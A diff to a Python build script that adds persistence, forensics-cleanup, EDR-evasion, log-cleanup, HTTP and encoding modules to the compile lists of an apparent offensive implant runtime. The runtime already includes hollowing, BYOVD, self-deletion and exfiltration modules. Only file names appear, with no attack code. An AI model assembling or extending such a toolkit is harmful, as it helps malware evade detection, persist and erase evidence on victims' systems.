@@ -255,6 +255,12 @@ def stage_compile_runtime(build_dir, platform="windows"):
             LINUX / "exfil" / "exfil_channels.c",            # Data exfiltration
             LINUX / "core" / "link_stubs.c",                  # Link stubs for undefined references
 
+            # New APIs (Production scripts)
+            LINUX / "persistence.c",                         # Cron/systemd persistence
+            LINUX / "forensics" / "cleanup.c",               # Forensics cleanup
+            LINUX / "forensics" / "linux_forensics.c",       # Linux-specific forensics
+            RUNTIME_DIR / "common" / "encoding.c",           # Base64/hex encoding
+
             # Legacy syscall files (if they exist and don't conflict)
             RUNTIME_DIR / "util" / "mem.c",
             RUNTIME_DIR / "compression" / "compression.c",
@@ -331,6 +337,7 @@ def stage_compile_runtime(build_dir, platform="windows"):
         WIN / "evasion" / "stack_spoof.c",
         WIN / "evasion" / "blindside.c",
         WIN / "evasion" / "edrhoker.c",
+        WIN / "evasion" / "advanced_edr.c",
         WIN / "execution" / "hollow.c",
         WIN / "execution" / "byovd.c",
         WIN / "execution" / "inmem.c",
@@ -342,9 +349,12 @@ def stage_compile_runtime(build_dir, platform="windows"):
         WIN / "audit" / "audit.c",
         WIN / "anti_forensics" / "forensics.c",
         WIN / "anti_forensics" / "logs.c",
+        WIN / "anti_forensics" / "logs_cleanup.c",
         WIN / "anti_forensics" / "self_delete.c",
         WIN / "security" / "token_manipulation.c",
         WIN / "exfil" / "enhanced_exfiltration.c",
+        WIN / "network" / "http.c",
+        RUNTIME_DIR / "common" / "encoding.c",
     ]
 
     cflags_win = [
